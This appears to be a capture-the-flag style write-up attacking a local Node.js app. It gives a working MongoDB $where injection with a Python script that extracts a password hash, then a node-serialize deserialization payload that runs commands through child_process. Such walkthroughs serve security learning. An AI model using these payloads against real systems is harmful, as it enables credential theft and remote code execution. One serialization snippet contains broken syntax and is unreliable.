# 1- Authentication Bypass

## 1.1 - SQL Injection

We can see in the code that MongoDB is running in the web server, in the register field we can see that the register field is vulnerable against SQL Injection : 

```js
var query = {$where: `this.username == '${username}'`};
```

If we try with `' || 1 == '1` we can see that works :

![image](https://user-images.githubusercontent.com/76447395/164094793-b860835d-8627-4d9c-9c2b-e710db6c9c19.png)

So at this point I made a script to automate the SQLi attack :

```py
import requests
s = requests.session()

url = "http://172.17.0.2:3000/register"


def sendQuery(url):
    output = "\n[+] OUTPUT : "
    print(output)
    y = 0
    finish = False
    while finish == False:
        for ascii_char in range(32, 126):

            data = { "username": "john' && this.password.charCodeAt({y})=='{char}".format(y=y,char=ascii_char), 
                        "password": "a" }
            r = s.post(url, data=data)

            if ('User already exists' in r.text):
                print(chr(ascii_char), end='', flush=True)
                output += chr(ascii_char)
                y += 1
                break
        else:
            return output

if __name__ == "__main__":
    sendQuery(url)
```

Output : `96d9632f363564cc3032521409cf22a852f2032eec099ed5967c0d000cec607a`

We can just crack the password -> `john`. 

# 2- RCE (Remote Code Execution)

## 2.1- NodeJS Deserialization

If we look around the source we can find out that when we save a message, this message is being unserialized. The following code shows how the message is saved :

```js
} else if (save != null) {
    console.log('    -- Save');
    var cookie_val = Buffer.from(serialize.serialize({'msg':req.body.message})).toString('base64');
    res.cookie('draft',cookie_val,{maxAge:900000,httpOnly:true});
}
```

The message is saved in the `draft` cookie and then it's unserialized :

```js
if (req.session.logged_in && req.cookies.draft) {
    draft = serialize.unserialize(new Buffer(req.cookies.draft, 'base64').toString()).msg;
}
```

The web server is using `node-serialize`, this library allows to serialize functions, for example :

```js
var y = {
 "rce": function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })},
}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```

Output : `{"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })}"}`

If we look at the output, we realize that there is a flag `_$$ND_FUNC$$_`, which is appended to the serialized object. Let's dig into the vulnerability here, if we go to 
`node_modules/node_serialize/lib/serialize.js` we can see that in the case that the `FUNCFLAG` (`_$$ND_FUNC$$_`) is found, eval is used to deserialize the funcion, so the 
user input will be executed :

```js
if(obj[key].indexOf(FUNCFLAG) === 0) {
        obj[key] = eval('(' + obj[key].substring(FUNCFLAG.length) + ')');
}
```

We know that the saved message object looks like : `{"msg":"foo"}`. So le's try to inject code there, in our case we'll be serializing this function :

```js
var y = {
    "msg": function(){ 
        require('child_process').exec('whoami', function(error, stdout, stderr) { 
            console.log(stdout) 
        })
    },
   }
```

So let's get the serialized object :

```js
var y = {"msg": function(){ require('child_process').exec('whoami', function(error, stdout, stderr) {console.log(stdout)})},()}
var serialize = require('node-serialize');
var payload_serialized = serialize.serialize(y);
console.log("Serialized: \n" + payload_serialized);
```

Output : `{"msg":"_$$ND_FUNC$$_function(){ require('child_process').exec('whoami', function(error, stdout, stderr) {console.log(stdout)})}"}`

Nice, but we have to add `()` at the final of the code for it to execute. We're gonna input `_$$ND_FUNC$$_function(){ require('child_process').exec('whoami', 
function(error, stdout, stderr) {console.log(stdout)})}()`

If we look at the console we see this :

![image](https://user-images.githubusercontent.com/76447395/164091479-313745a5-a7f6-489c-ab61-d69aabacb020.png)

Nice, it worked!
